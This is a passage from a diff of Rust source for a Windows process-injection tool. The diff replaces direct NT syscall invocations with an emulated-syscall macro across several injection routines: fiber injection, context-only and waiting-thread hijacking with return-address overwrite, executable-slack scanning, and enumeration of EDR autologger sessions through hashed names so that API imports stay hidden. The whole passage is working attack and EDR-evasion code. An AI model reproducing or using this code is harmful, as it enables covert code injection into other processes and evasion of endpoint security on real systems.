         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -7324,7 +7324,7 @@ fn inject_fiber(
             0x04u64,   // PAGE_READWRITE
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: InjectionTechnique::FiberInject,
                 reason: "failed to allocate stub memory".to_string(),
@@ -7332,7 +7332,7 @@ fn inject_fiber(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -7351,7 +7351,7 @@ fn inject_fiber(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -7361,7 +7361,7 @@ fn inject_fiber(
         );
 
         // Flush I-cache.
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -7370,10 +7370,10 @@ fn inject_fiber(
 
         // Create a suspended thread to run the fiber stub, then resume.
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
 
         // Close thread — fire-and-forget.
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -7516,7 +7516,7 @@ fn inject_context_only(
         let mut h_proc: usize = 0;
         // PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION
         let access_mask: u64 = 0x0020 | 0x0008 | 0x0400;
-        let open_status = nt_syscall::syscall!(
+        let open_status = emulated_syscall!(
             "NtOpenProcess",
             &mut h_proc as *mut _ as u64,
             access_mask,
@@ -7534,7 +7534,7 @@ fn inject_context_only(
 
         macro_rules! cleanup_and_err {
             ($msg:expr) => {{
-                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+                let _ = emulated_syscall!("NtClose", h_proc as u64);
                 return Err(InjectionError::InjectionFailed {
                     technique: InjectionTechnique::ContextOnly,
                     reason: $msg.to_string(),
@@ -7555,7 +7555,7 @@ fn inject_context_only(
                              falling back to ThreadHijack",
                             pid,
                         );
-                        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+                        let _ = emulated_syscall!("NtClose", h_proc as u64);
                         return inject_thread_hijack(pid, payload);
                     }
                 }
@@ -7580,7 +7580,7 @@ fn inject_context_only(
         obj_attr2.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_thread: usize = 0;
-        let open_thread_status = nt_syscall::syscall!(
+        let open_thread_status = emulated_syscall!(
             "NtOpenThread",
             &mut h_thread as *mut _ as u64,
             thread_access,
@@ -7599,14 +7599,14 @@ fn inject_context_only(
         let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
         ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
 
-        let get_ctx_status = nt_syscall::syscall!(
+        let get_ctx_status = emulated_syscall!(
             "NtGetContextThread",
             h_thread as u64,
             &mut ctx as *mut _ as u64,
         );
 
         if get_ctx_status.is_err() || get_ctx_status.unwrap() < 0 {
-            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+            let _ = emulated_syscall!("NtClose", h_thread as u64);
             cleanup_and_err!("NtGetContextThread failed");
         }
 
@@ -7660,7 +7660,7 @@ fn inject_context_only(
                 original_rsp - STACK_WRITE_OFFSET as u64
             } else {
                 // Stack is too small — fall back.
-                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                let _ = emulated_syscall!("NtClose", h_thread as u64);
                 cleanup_and_err!("stack too small for CONTEXT-only payload delivery");
             };
 
@@ -7702,7 +7702,7 @@ fn inject_context_only(
                     let stack_write_addr = if original_rsp > STACK_WRITE_OFFSET as u64 {
                         (original_rsp - STACK_WRITE_OFFSET as u64) & !0xF
                     } else {
-                        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                        let _ = emulated_syscall!("NtClose", h_thread as u64);
                         cleanup_and_err!(
                             "no executable slack found and stack too small for section delivery"
                         );
@@ -7714,7 +7714,7 @@ fn inject_context_only(
 
         // ── Write the combined payload + trampoline ─────────────────────
         let mut written = 0usize;
-        let write_status = nt_syscall::syscall!(
+        let write_status = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             write_addr as u64,
@@ -7724,7 +7724,7 @@ fn inject_context_only(
         );
 
         if write_status.is_err() || write_status.unwrap() < 0 || written != combined_len {
-            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+            let _ = emulated_syscall!("NtClose", h_thread as u64);
             cleanup_and_err!(format!(
                 "NtWriteVirtualMemory to {} failed (written={}/{})",
                 delivery_method, written, combined_len
@@ -7756,14 +7756,14 @@ fn inject_context_only(
         }
 
         // Flush I-cache for the written region (important for section delivery).
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             write_addr as u64,
             combined_len as u64,
         );
 
-        let set_ctx_status = nt_syscall::syscall!(
+        let set_ctx_status = emulated_syscall!(
             "NtSetContextThread",
             h_thread as u64,
             &ctx as *const _ as u64,
@@ -7774,12 +7774,12 @@ fn inject_context_only(
             ctx.Rip = original_rip;
             ctx.Rsp = original_rsp;
             ctx.Rbp = original_rbp;
-            let _ = nt_syscall::syscall!(
+            let _ = emulated_syscall!(
                 "NtSetContextThread",
                 h_thread as u64,
                 &ctx as *const _ as u64,
             );
-            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+            let _ = emulated_syscall!("NtClose", h_thread as u64);
             cleanup_and_err!("NtSetContextThread failed");
         }
 
@@ -7797,7 +7797,7 @@ fn inject_context_only(
 
         // Try NtResumeThread first (works for suspended threads).
         let mut suspend_count: u32 = 0;
-        let resume_status = nt_syscall::syscall!(
+        let resume_status = emulated_syscall!(
             "NtResumeThread",
             h_thread as u64,
             &mut suspend_count as *mut _ as u64,
@@ -7814,7 +7814,7 @@ fn inject_context_only(
             // alertable wait. If the thread is in a non-alertable wait,
             // this is a no-op and the thread will execute from the modified
             // RIP when the wait resolves naturally.
-            let alert_status = nt_syscall::syscall!(
+            let alert_status = emulated_syscall!(
                 "NtAlertThread",
                 h_thread as u64,
             );
@@ -7852,7 +7852,7 @@ fn inject_context_only(
             let mut check_ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
             check_ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL;
 
-            let check_status = nt_syscall::syscall!(
+            let check_status = emulated_syscall!(
                 "NtGetContextThread",
                 h_thread as u64,
                 &mut check_ctx as *mut _ as u64,
@@ -7898,7 +7898,7 @@ fn inject_context_only(
         if delivery_method.starts_with("stack") {
             let zero_buf = vec![0u8; combined_len];
             let mut zero_written = 0usize;
-            let _ = nt_syscall::syscall!(
+            let _ = emulated_syscall!(
                 "NtWriteVirtualMemory",
                 h_proc as u64,
                 write_addr as u64,
@@ -7914,7 +7914,7 @@ fn inject_context_only(
         }
 
         // Close thread handle.
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         // Return handle with the write address as injected_base_addr.
         // process_handle is kept for potential eject/cleanup.
@@ -8184,7 +8184,7 @@ unsafe fn find_executable_slack(
     let mut addr: usize = 0x10000; // Start scanning from 64KB (skip null page)
 
     loop {
-        let result = nt_syscall::syscall!(
+        let result = emulated_syscall!(
             "NtQueryVirtualMemory",
             h_proc as u64,
             addr as u64,
@@ -8217,7 +8217,7 @@ unsafe fn find_executable_slack(
                 let read_size = chunk_size.min(region_size - scan_offset);
                 let mut bytes_read: usize = 0;
 
-                let rs = nt_syscall::syscall!(
+                let rs = emulated_syscall!(
                     "NtReadVirtualMemory",
                     h_proc as u64,
                     (region_base + scan_offset) as u64,
@@ -8392,7 +8392,7 @@ fn inject_waiting_thread_hijack(
         // PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
         // PROCESS_QUERY_INFORMATION
         let access_mask: u64 = 0x0020 | 0x0008 | 0x0010 | 0x0400;
-        let open_status = nt_syscall::syscall!(
+        let open_status = emulated_syscall!(
             "NtOpenProcess",
             &mut h_proc as *mut _ as u64,
             access_mask,
@@ -8418,7 +8418,7 @@ fn inject_waiting_thread_hijack(
 
         macro_rules! cleanup_and_err {
             ($msg:expr) => {{
-                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+                let _ = emulated_syscall!("NtClose", h_proc as u64);
                 return Err(InjectionError::InjectionFailed {
                     technique: wth_technique.clone(),
                     reason: $msg.to_string(),
@@ -8444,7 +8444,7 @@ fn inject_waiting_thread_hijack(
                              falling back to ContextOnly",
                             pid,
                         );
-                        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+                        let _ = emulated_syscall!("NtClose", h_proc as u64);
                         return inject_context_only(pid, None, payload)
                             .or_else(|_| inject_thread_hijack(pid, payload));
                     }
@@ -8476,7 +8476,7 @@ fn inject_waiting_thread_hijack(
         obj_attr2.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_thread: usize = 0;
-        let open_thread_status = nt_syscall::syscall!(
+        let open_thread_status = emulated_syscall!(
             "NtOpenThread",
             &mut h_thread as *mut _ as u64,
             thread_access,
@@ -8499,14 +8499,14 @@ fn inject_waiting_thread_hijack(
         let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
         ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL; // Only control registers
 
-        let get_ctx_status = nt_syscall::syscall!(
+        let get_ctx_status = emulated_syscall!(
             "NtGetContextThread",
             h_thread as u64,
             &mut ctx as *mut _ as u64,
         );
 
         if get_ctx_status.is_err() || get_ctx_status.unwrap() < 0 {
-            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+            let _ = emulated_syscall!("NtClose", h_thread as u64);
             cleanup_and_err!("NtGetContextThread failed (read RSP only)");
         }
 
@@ -8538,7 +8538,7 @@ fn inject_waiting_thread_hijack(
 
         let mut stack_buf = vec![0u8; WTH_STACK_READ_SIZE];
         let mut bytes_read: usize = 0;
-        let read_status = nt_syscall::syscall!(
+        let read_status = emulated_syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             thread_rsp as u64,
@@ -8548,7 +8548,7 @@ fn inject_waiting_thread_hijack(
         );
 
         if read_status.is_err() || read_status.unwrap() < 0 || bytes_read < 64 {
-            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+            let _ = emulated_syscall!("NtClose", h_thread as u64);
             cleanup_and_err!("NtReadVirtualMemory (stack) failed");
         }
 
@@ -8569,8 +8569,8 @@ fn inject_waiting_thread_hijack(
                      falling back to ContextOnly",
                     candidate.tid,
                 );
-                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
-                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+                let _ = emulated_syscall!("NtClose", h_thread as u64);
+                let _ = emulated_syscall!("NtClose", h_proc as u64);
                 return inject_context_only(pid, None, payload)
                     .or_else(|_| inject_thread_hijack(pid, payload));
             }
@@ -8610,7 +8610,7 @@ fn inject_waiting_thread_hijack(
             let stack_write_addr = if thread_rsp > STACK_WRITE_OFFSET as u64 {
                 (thread_rsp - STACK_WRITE_OFFSET as u64) & !0xF
             } else {
-                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                let _ = emulated_syscall!("NtClose", h_thread as u64);
                 cleanup_and_err!("stack too small for WTH payload delivery");
             };
 
@@ -8636,7 +8636,7 @@ fn inject_waiting_thread_hijack(
                     let stack_write_addr = if thread_rsp > STACK_WRITE_OFFSET as u64 {
                         (thread_rsp - STACK_WRITE_OFFSET as u64) & !0xF
                     } else {
-                        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+                        let _ = emulated_syscall!("NtClose", h_thread as u64);
                         cleanup_and_err!(
                             "no executable slack found and stack too small for WTH"
                         );
@@ -8648,7 +8648,7 @@ fn inject_waiting_thread_hijack(
 
         // Write the combined payload + trampoline.
         let mut written = 0usize;
-        let write_status = nt_syscall::syscall!(
+        let write_status = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             write_addr as u64,
@@ -8658,7 +8658,7 @@ fn inject_waiting_thread_hijack(
         );
 
         if write_status.is_err() || write_status.unwrap() < 0 || written != combined_len {
-            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+            let _ = emulated_syscall!("NtClose", h_thread as u64);
             cleanup_and_err!(format!(
                 "NtWriteVirtualMemory (payload) to {} failed (written={}/{})",
                 delivery_method, written, combined_len
@@ -8678,7 +8678,7 @@ fn inject_waiting_thread_hijack(
         // return address that the thread will pop when the wait completes.
         let payload_addr_bytes = (write_addr as u64).to_le_bytes();
         let mut ret_written = 0usize;
-        let overwrite_status = nt_syscall::syscall!(
+        let overwrite_status = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             return_addr_stack_location as u64,
@@ -8691,7 +8691,7 @@ fn inject_waiting_thread_hijack(
             // Failed to overwrite return address. Try to clean up the
             // payload we wrote.
             let zero_buf = vec![0u8; combined_len];
-            let _ = nt_syscall::syscall!(
+            let _ = emulated_syscall!(
                 "NtWriteVirtualMemory",
                 h_proc as u64,
                 write_addr as u64,
@@ -8699,7 +8699,7 @@ fn inject_waiting_thread_hijack(
                 combined_len as u64,
                 0u64, // don't care about bytes written
             );
-            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+            let _ = emulated_syscall!("NtClose", h_thread as u64);
             cleanup_and_err!("NtWriteVirtualMemory (return address overwrite) failed");
         }
 
@@ -8751,7 +8751,7 @@ fn inject_waiting_thread_hijack(
             let mut check_ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
             check_ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL;
 
-            let check_status = nt_syscall::syscall!(
+            let check_status = emulated_syscall!(
                 "NtGetContextThread",
                 h_thread as u64,
                 &mut check_ctx as *mut _ as u64,
@@ -8793,7 +8793,7 @@ fn inject_waiting_thread_hijack(
         // Zero out the payload bytes on the stack/section.
         let zero_buf = vec![0u8; combined_len];
         let mut zero_written = 0usize;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             write_addr as u64,
@@ -8806,7 +8806,7 @@ fn inject_waiting_thread_hijack(
         // still waiting or if we got there before the wait resolved).
         let orig_addr_bytes = original_return_addr.to_le_bytes();
         let mut restore_written = 0usize;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             return_addr_stack_location as u64,
@@ -8822,7 +8822,7 @@ fn inject_waiting_thread_hijack(
         );
 
         // Close thread handle.
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -9005,7 +9005,7 @@ unsafe fn find_return_address_on_stack(
     //
     // First, determine ntdll's size by querying its memory region.
     let mut mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
-    let query_status = nt_syscall::syscall!(
+    let query_status = emulated_syscall!(
         "NtQueryVirtualMemory",
         h_proc as u64,
         ntdll_base as u64,
@@ -9066,7 +9066,7 @@ unsafe fn find_return_address_on_stack(
             // Could be a return address to application code. Verify it's in
             // an executable region.
             let mut check_mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
-            let check_status = nt_syscall::syscall!(
+            let check_status = emulated_syscall!(
                 "NtQueryVirtualMemory",
                 h_proc as u64,
                 val as u64,
@@ -9254,7 +9254,7 @@ const KEY_READ_MASK: u32 =
 /// and cross-references the subkey name against compile-time djb2 hashes
 /// of known EDR auto-logger names.
 ///
-/// All NT registry functions are resolved through `nt_syscall::syscall!`
+/// All NT registry functions are resolved through `emulated_syscall!`
 /// to avoid touching advapi32's IAT.
 ///
 /// # Safety
@@ -9288,7 +9288,7 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
     };
 
     let mut h_key: usize = 0;
-    let status = nt_syscall::syscall!(
+    let status = emulated_syscall!(
         "NtOpenKey",
         &mut h_key as *mut _ as u64,
         KEY_READ_MASK as u64,
@@ -9304,7 +9304,7 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
     struct KeyGuard(usize);
     impl Drop for KeyGuard {
         fn drop(&mut self) {
-            let _ = unsafe { nt_syscall::syscall!("NtClose", self.0 as u64) };
+            let _ = unsafe { emulated_syscall!("NtClose", self.0 as u64) };
         }
     }
     let _guard = KeyGuard(h_key);
@@ -9323,7 +9323,7 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
 
     loop {
         let mut result_len: u32 = 0;
-        let status = nt_syscall::syscall!(
+        let status = emulated_syscall!(
             "NtEnumerateKey",
             h_key as u64,                        // KeyHandle
             index as u64,                        // Index
@@ -9401,7 +9401,7 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
         let mut value_buf = [0u8; VALUE_INFO_BUF_SIZE];
         let mut value_result_len: u32 = 0;
 
-        let vstatus = nt_syscall::syscall!(
+        let vstatus = emulated_syscall!(
             "NtQueryValueKey",
             h_key as u64,                            // KeyHandle
             &mut value_name as *mut _ as u64,        // ValueName
@@ -9464,7 +9464,7 @@ unsafe fn alloc_write_exec(
         | PROCESS_VM_WRITE
         | PROCESS_CREATE_THREAD
         | PROCESS_QUERY_INFORMATION) as u64;
-    let open_status = nt_syscall::syscall!(
+    let open_status = emulated_syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
         access_mask,
@@ -9483,7 +9483,7 @@ unsafe fn alloc_write_exec(
 
     macro_rules! cleanup_and_err {
         ($technique:expr, $msg:expr) => {{
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: $technique,
                 reason: $msg.to_string(),
@@ -9494,7 +9494,7 @@ unsafe fn alloc_write_exec(
     // Allocate RW memory.
     let mut remote_mem: *mut c_void = std::ptr::null_mut();
     let mut alloc_size = payload.len();
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtAllocateVirtualMemory",
         h_proc as u64,
         &mut remote_mem as *mut _ as u64,
@@ -9509,7 +9509,7 @@ unsafe fn alloc_write_exec(
 
     // Write payload.
     let mut written = 0usize;
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtWriteVirtualMemory",
         h_proc as u64,
         remote_mem as u64,
@@ -9525,7 +9525,7 @@ unsafe fn alloc_write_exec(
     let mut old_prot = 0u32;
     let mut prot_base = remote_mem as usize;
     let mut prot_size = payload.len();
-    let s = nt_syscall::syscall!(
+    let s = emulated_syscall!(
         "NtProtectVirtualMemory",
         h_proc as u64,
         &mut prot_base as *mut _ as u64,
@@ -9538,7 +9538,7 @@ unsafe fn alloc_write_exec(
     }
 
     // Flush I-cache.
-    let _ = nt_syscall::syscall!(
+    let _ = emulated_syscall!(
         "NtFlushInstructionCache",
         h_proc as u64,
         remote_mem as u64,
